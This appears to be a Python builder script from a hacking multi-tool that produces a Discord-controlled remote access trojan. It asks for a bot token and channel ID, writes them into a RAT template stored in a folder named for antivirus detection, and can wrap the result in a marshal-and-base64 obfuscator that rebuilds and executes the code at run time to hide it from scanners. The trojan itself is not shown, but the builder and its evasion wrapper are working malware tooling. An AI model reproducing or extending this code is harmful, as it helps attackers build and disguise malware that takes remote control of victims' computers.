from Config.Config import *
from Config.Util import *
from Config.Translates import *
import os
import re
import marshal
import base64

current_language = LANGUAGE

Slow(rat_banner)

def tr(key):
    return translations[current_language].get(key, key)

def encode_chunk(chunk):
    return base64.b64encode(chunk).decode('ascii')

def decode_chunk(encoded_chunk):
    return base64.b64decode(encoded_chunk.encode('ascii'))

def obfuscate_code(source_code, chunk_size=100):
    compiled_code = compile(source_code, '<string>', 'exec')
    serialized_code = marshal.dumps(compiled_code)

    chunks = [serialized_code[i:i+chunk_size] for i in range(0, len(serialized_code), chunk_size)]
    encoded_chunks = [encode_chunk(chunk) for chunk in chunks]

    class_name = "Titan"
    obfuscated_class = f"class {class_name}:\n"

    for i, encoded_chunk in enumerate(encoded_chunks):
        obfuscated_class += f"    part{i} = {repr(encoded_chunk)}\n"

    obfuscated_class += f"\n    @staticmethod\n"
    obfuscated_class += f"    def assemble_and_execute():\n"
    obfuscated_class += "        import base64, marshal\n"

    parts_list = [f"base64.b64decode({class_name}.part{i})" for i in range(len(encoded_chunks))]
    obfuscated_class += f"        parts = [{', '.join(parts_list)}]\n"
    obfuscated_class += f"        exec(marshal.loads(b''.join(parts)))\n"

    obfuscated_code = f"{obfuscated_class}\n"
    obfuscated_code += f"{class_name}.assemble_and_execute()\n"

    return obfuscated_code

def main():
    token = input(f"\n{INPUT} {tr('TokenBot')} -> {reset}")
    channel_id = input(f"\n{INPUT} {tr('ChannelIDRAT')} -> {reset}")
    output_filename = input(f"\n{INPUT} {tr('FileName')} -> {reset}")
    output_filename += '.py'

    source_file = 'Settings/FileDetectedByAntivirus/RAT.py'

    with open(source_file, 'r', encoding='utf-8') as file:
        file_content = file.read()

    file_content = re.sub(r"TOKEN\s*=\s*'.*'", f"TOKEN = '{token}'", file_content)
    file_content = re.sub(r"CHANNEL_ID\s*=\s*['\"]?.*['\"]?", f"CHANNEL_ID = {channel_id}", file_content)

    if "intents = discord.Intents.default()" not in file_content:
        file_content = file_content.replace("intents.message_content = True", "intents = discord.Intents.default()\nintents.message_content = True")

    output_dir = '1-Output/Rat/'
    os.makedirs(output_dir, exist_ok=True)
    output_file = os.path.join(output_dir, output_filename)

    with open(output_file, 'w', encoding='utf-8') as file:
        file.write(file_content)

    print(f"\n{INFO} {tr('RatSucces')} {reset}{output_file}{reset} \n")

    obfuscate = input(f"{INPUT} {tr('ObfY')} ").strip().lower()

    if obfuscate in ['y', 'Y', 'Yes', 'yes', 'YES', 'o', 'O', 'Oui', 'oui', 'OUI']:
        with open(output_file, 'r', encoding='utf-8') as f:
            source_code = f.read()

        obfuscated_code = obfuscate_code(source_code)

        obfuscated_file_name = f"obf_{output_filename}"
        obfuscated_file_path = os.path.join(output_dir, obfuscated_file_name)

        with open(obfuscated_file_path, 'w', encoding='utf-8') as f:
            f.write(obfuscated_code)

        print(f"\n{INFO} {tr('ObfSucces')} {reset}{obfuscated_file_path}\n")
    else:
        Continue()
        Reset()

    Continue()
    Reset()

if __name__ == "__main__":
    main()
